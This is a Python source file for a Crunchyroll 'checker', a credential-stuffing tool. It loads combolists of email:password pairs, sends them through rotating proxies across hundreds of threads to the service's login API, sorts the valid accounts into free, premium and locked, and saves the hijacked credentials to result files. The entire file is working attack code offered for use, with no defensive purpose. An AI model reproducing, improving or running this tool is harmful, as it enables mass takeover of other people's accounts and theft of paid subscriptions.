import json
import threading
import datetime
import random
import calendar
from cloudscraper import create_scraper
from colorama import Fore, init
from os import system, path, mkdir, makedirs
from Consolly import consoler
from easygui import fileopenbox
from time import sleep, strftime, gmtime
init()
console = consoler()
txt = [f'''
\t\t\t\t    {Fore.LIGHTWHITE_EX}   _____                      _           
\t\t\t\t    {Fore.LIGHTWHITE_EX}  / ____|                    | |          
\t\t\t\t    {Fore.LIGHTWHITE_EX} | |     _ __ __ _ _ __   ___| |__  _   _ 
\t\t\t\t    {Fore.LIGHTWHITE_EX} | |    | '__/ _` | '_ \ / __| '_ \| | | |
\t\t\t\t    {Fore.LIGHTWHITE_EX} | |____| | | (_| | | | | (__| | | | |_| |
\t\t\t\t    {Fore.LIGHTWHITE_EX}  \_____|_|  \__,_|_| |_|\___|_| |_|\__, |
\t\t\t\t    {Fore.LIGHTWHITE_EX}         Another crunchyroll-Checker __/ |
\t\t\t\t    {Fore.LIGHTWHITE_EX}                                    |___/ 
''']
text = random.choice(txt)
requests = create_scraper()
default_config = {"checker": {"threads": 250, "split": ":", 'print_bads': True, "save_bads": True}, "proxy": {"proxytype": "socks4","timeout": 5000,"api": False}}

if not path.exists('config.json'):
    with open('config.json', 'w') as f:
        json.dump(default_config, f, indent=4)

    with open('config.json') as f:
        data = json.load(f)
else:
    with open('config.json') as f:
        data = json.load(f)

class Config:
    timeout = int(data['proxy']['timeout'])
    threads = int(data['checker']['threads'])
    print_bads = bool(data['checker']['print_bads'])
    save_bads = bool(data['checker']['save_bads'])
    proxy_type = str(data['proxy']['proxytype'])

class App:
    def __init__(self):
        self.combo = []
        self.proxies = []
        self.now = datetime.datetime.now()
        self.month_abr = calendar.month_abbr[int(self.now.strftime("%m"))]
        self.time_save = f'{self.month_abr} ─ {self.now.day} ─ {strftime("%Y")}, {strftime("%H-%M-%S")}'
        self.results_ = 'results/{}'.format(self.time_save)
        self.results = '{}'.format(self.time_save)
        self.proxy_type = ''
        self.hits = 0
        self.bad = 0
        self.combo_count = 0
        self.proxies_count = 0
        self.free = 0
        self.premium = 0
        self.locked = 0
        self.checked = 0
        self.retries = 0
        self.cpm = 0
        self.stop = False
        self.files(check=True)
        self.menu()
    
    def files(self, check: bool=None, create: str=None):
        if check == True:
            if not path.exists('results'):
                mkdir('results')
            if not path.exists('config.json'):
                with open('config.json', 'w') as f:
                    json.dump(default_config, f, indent=4)
        elif create == 'save':
            if not path.exists(self.results_):
                mkdir(self.results_)

    def cpm_counter(self):
        while self.stop:
            if self.checked >= 1:
                now = self.checked
                sleep(1)
                self.cpm = (self.checked - now) * 20

    def title(self):
        while self.stop:
            console.set_title(
                f'Cruncheck - Hits: {self.hits} - Bads: {self.bad}'
                f'{"" if self.free == 0 else f" | Free: {self.free}"}'
                f'{"" if self.premium == 0 else f" - Premium: {self.premium}"}'
                f'{"" if self.locked == 0 else f" - Locked: {self.locked}"}'
                f' - Remaining: {self.combo_count - self.checked}/{self.combo_count}'
                f' - CPM: {self.cpm}'
            )
    
    def GetCombolist(self):
        try:
            if path.exists('combo.txt'):
                option = input(f'{Fore.LIGHTWHITE_EX}[+] Combolist detected ({Fore.LIGHTBLUE_EX}combo.txt{Fore.LIGHTWHITE_EX})\n[+] Do you want to use this file or select another one?\n[y/n] > ')
                if option == 'n':
                    with open('combo.txt') as file:
                        for i in file:
                            self.combo.append(i.split('\n')[0])
                            self.combo_count += 1
                elif option == 'y':
                    console.clear()
                    print(text)
                    print(f'{Fore.LIGHTWHITE_EX}[x] Import your combolist')
                    sleep(1)
                    file = fileopenbox(
                        title = 'Cranchy - Import your combolist',
                        filetypes=['*.txt']
                    )
                    with open(file, encoding='utf-8', errors='ignore') as f:
                        for i in f:
                            self.combo.append(i.split('\n')[0])
                            self.combo_count += 1
                else:
                    console.clear()
                    print(text)
                    print(f'{Fore.LIGHTWHITE_EX}[x] Import your combolist')
                    sleep(1)
                    file = fileopenbox(
                        title = 'Cranchy - Import your combolist',
                        filetypes=['*.txt']
                    )
                    with open(file, encoding='utf-8', errors='ignore') as f:
                        for i in f:
                            self.combo.append(i.split('\n')[0])
                            self.combo_count += 1
            else:
                console.clear()
                print(text)
                print(f'{Fore.LIGHTWHITE_EX}[x] Import your combolist')
                sleep(1)
                file = fileopenbox(
                    title = 'Cranchy - Import your combolist',
                    filetypes=['*.txt']
                )
                with open(file, encoding='utf-8', errors='ignore') as f:
                    for i in f:
                        self.combo.append(i.split('\n')[0])
                        self.combo_count += 1
        except Exception as e:
            print(f'{Fore.LIGHTWHITE_EX}[-] An error occurred try again: {e}')
            quit()
    
    def GetProxies(self):
        try:
            if path.exists('proxies.txt'):
                option = input(f'{Fore.LIGHTWHITE_EX}[+] Proxies detected ({Fore.LIGHTBLUE_EX}proxies.txt{Fore.LIGHTWHITE_EX})\n[+] Do you want to use this file or select another one?\n[y/n] > ')
                if option == 'n':
                    with open('proxies.txt') as file:
                        for i in file:
                            proxy = i.split('\n')[0]
                            if Config.proxy_type in ['https', 'http']:
                                self.proxy_type = 'http/s'
                                self.proxies.append({'http': f"http://{proxy}", 'https': f"https://{proxy}"})
                            else:
                                proxy_type = Config.proxy_type
                                self.proxy_type = proxy_type
                                self.proxies.append({'http': f"{proxy_type}://{proxy}", 'https': f"{proxy_type}://{proxy}"})
                            self.proxies_count += 1
                elif option == 'y':
                    console.clear()
                    print(text)
                    print(f'{Fore.LIGHTWHITE_EX}[x] Import your proxies')
                    sleep(1)
                    file = fileopenbox(
                        title = 'Cranchy - Import your proxies',
                        filetypes=['*.txt']
                    )
                    with open(file, encoding='utf-8', errors='ignore') as f:
                        for i in f:
                            proxy = i.split('\n')[0]
                            proxy_type = Config.proxy_type
                            if Config.proxy_type in ['https', 'http']:
                                self.proxy_type = 'http/s'
                                self.proxies.append({'http': f"http://{proxy}", 'https': f"https://{proxy}"})
                            else:
                                self.proxy_type = proxy_type
                                self.proxies.append({'http': f"{proxy_type}://{proxy}", 'https': f"{proxy_type}://{proxy}"})
                            self.proxies_count += 1
                else:
                    console.clear()
                    print(text)
                    print(f'{Fore.LIGHTWHITE_EX}[x] Import your proxies')
                    sleep(1)
                    file = fileopenbox(
                        title = 'Cranchy - Import your proxies',
                        filetypes=['*.txt']
                    )
                    with open(file, encoding='utf-8', errors='ignore') as f:
                        for i in f:
                            proxy = i.split('\n')[0]
                            proxy_type = Config.proxy_type
                            if Config.proxy_type in ['https', 'http']:
                                self.proxy_type = 'http/s'
                                self.proxies.append({'http': f"http://{proxy}", 'https': f"https://{proxy}"})
                            else:
                                self.proxy_type = proxy_type
                                self.proxies.append({'http': f"{proxy_type}://{proxy}", 'https': f"{proxy_type}://{proxy}"})
                            self.proxies_count += 1
            else:
                console.clear()
                print(text)
                print(f'{Fore.LIGHTWHITE_EX}[x] Import your proxies')
                sleep(1)
                file = fileopenbox(
                    title = 'Cranchy - Import your proxies',
                    filetypes=['*.txt']
                )
                with open(file, encoding='utf-8', errors='ignore') as f:
                    for i in f:
                        proxy = i.split('\n')[0]
                        proxy_type = Config.proxy_type
                        if Config.proxy_type in ['https', 'http']:
                            self.proxy_type = 'http/s'
                            self.proxies.append({'http': f"http://{proxy}", 'https': f"https://{proxy}"})
                        else:
                            self.proxy_type = proxy_type
                            self.proxies.append({'http': f"{proxy_type}://{proxy}", 'https': f"{proxy_type}://{proxy}"})
                        self.proxies_count += 1
        except Exception as e:
            print(f'{Fore.LIGHTWHITE_EX}[-] An error occurred try again: {e}')
            quit()
    
    def CrunchyCheck(self, email, password):
        try:
            sess = requests
            proxy = random.choice(self.proxies)
            sess.proxies.update(proxy)
            data = sess.post(
                url='https://api.crunchyroll.com/start_session.0.json', 
                proxies=proxy,
                timeout=int(Config.timeout),
                data={
                'version': '1.0', 
                'access_token': 'LNDJgOit5yaRIWN',       
                'device_type': 'com.crunchyroll.windows.desktop', 
                'device_id': 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId', 
                'account': email, 
                'password': password
                }
            )
            if "session_id" in data.text:
                cookies = json.loads(data.text)
                coodata = cookies["data"]
                coodata = coodata["session_id"]

                r = sess.post(
                    url = 'https://api.crunchyroll.com/login.0.json',
                    proxies=proxy,
                    timeout=int(Config.timeout),
                    data={
                    'account': email, 
                    'password': password, 
                    'session_id': coodata
                    }
                )
                info = json.loads(r.text)

                if info["code"] == "ok":
                    self.checked += 1
                    self.hits += 1
                    data = info["data"]
                    userdata = data["user"]
                    expire = data["expires"]
                    name = userdata["username"]
                    subscription = userdata["access_type"]
                    if name is None:
                        username = 'Username has not been set'
                    else:
                        username = name
                    
                    if subscription is None:
                        self.free += 1
                        sub = 'Free'
                    else:
                        self.premium += 1
                        sub = subscription

                    print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX}>{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}{email}:{password} | Plan: {sub} ~ Expires: {expire} ~ Username: {name}')
                    
                    detailed = f'''->->->->->->->->->->\n> Email: {email}\n> Password: {password}\n> Username: {name}\n> Subscription: {sub}\n> Expires: {expire}\n'''
                    
                    if subscription is None:
                        open(f'results/{self.results}/Crunchyroll-Free.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} | Plan: {subscription} ~ Username: {username}\n')
                    else:
                        open(f'results/{self.results}/Crunchyroll-Premiums.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} | Plan: {subscription} ~ Expires: {expire} ~ Username: {username}\n')
                        
                    open(f'results/{self.results}/Crunchy-RAW-hits.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                    open(f'results/{self.results}/Crunchy-Detailed-hits.txt', 'a', encoding='UTF-8', errors='ignore').write(detailed)

                elif "The owner of this website (api.crunchyroll.com) has banned you temporarily from accessing this website." in data.text:
                    self.checked += 1
                    self.retries += 1
                else:
                    if info["message"] == "Incorrect login information.":
                        self.checked += 1
                        self.bad += 1
                        if Config.print_bads == True:
                            print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}>{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}{email}:{password}')
                        elif Config.print_bads == False:
                            pass
                        else:
                            pass
                        if Config.save_bads == True:
                            open(f'results/{self.results}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                        elif Config.save_bads == False:
                            pass
                        else:
                            pass
                    elif info['message'] == 'You forgot to put in your User Name or Email.':
                        self.checked += 1
                        self.bad += 1
                        if Config.print_bads == True:
                            print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}>{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}{email}:{password}')
                        elif Config.print_bads == False:
                            pass
                        else:
                            pass
                        if Config.save_bads == True:
                            open(f'results/{self.results}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                        elif Config.save_bads == False:
                            pass
                        else:
                            pass
                    elif info['message'] == 'You forgot to put in your password.':
                        self.checked += 1
                        self.bad += 1
                        if Config.print_bads == True:
                            print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}>{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}{email}:{password}')
                        elif Config.print_bads == False:
                            pass
                        else:
                            pass
                        if Config.save_bads == True:
                            open(f'results/{self.results}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                        elif Config.save_bads == False:
                            pass
                        else:
                            pass
                    elif info['message'] == 'Your account has been temporarily locked. Please try again later or contact us.':
                        self.locked += 1
                        open(f'results/{self.results}/Locked.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                    else:
                        print('{}> {}'.format(Fore.LIGHTRED_EX, info['message']))
            else:
                print('> {}'.format(info))
        except Exception as e:
            self.retries += 1

    def worker_crunchy(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            try:
                combination = combos[self.check[thread_id]].split(':')
                self.CrunchyCheck(combination[0], combination[1])
                self.check[thread_id] += 1 
            except Exception as e:
                pass

    def start_work_crunchy(self):
        self.threadcount = Config.threads
        threads = []
        self.check = [0 for i in range(self.threadcount)]

        for i in range(self.threadcount):
            sliced_combo = self.combo[int(len(self.combo) / self.threadcount * i): int(len(self.combo)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker_crunchy, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()
                
        for t in threads:
            t.join()
    
    def menu(self):
        console.clear()
        print(text)
        self.GetCombolist()
        self.GetProxies()
        console.clear()
        print(text)
        print(f'{Fore.LIGHTWHITE_EX}[:] {self.combo_count} Lines loaded from your combolist')
        print(f'{Fore.LIGHTWHITE_EX}[:] {self.proxies_count} ({self.proxy_type}) Lines loaded from your local proxies')
        print(f'{Fore.LIGHTWHITE_EX}[>] Starting...')
        sleep(0.5)
        if not path.exists(self.results_):
            mkdir(self.results_)
        self.stop = True
        threading.Thread(target=self.cpm_counter, daemon=True).start()
        threading.Thread(target=self.title).start()
        self.start_work_crunchy()
        quit()
if __name__ == '__main__':
    App()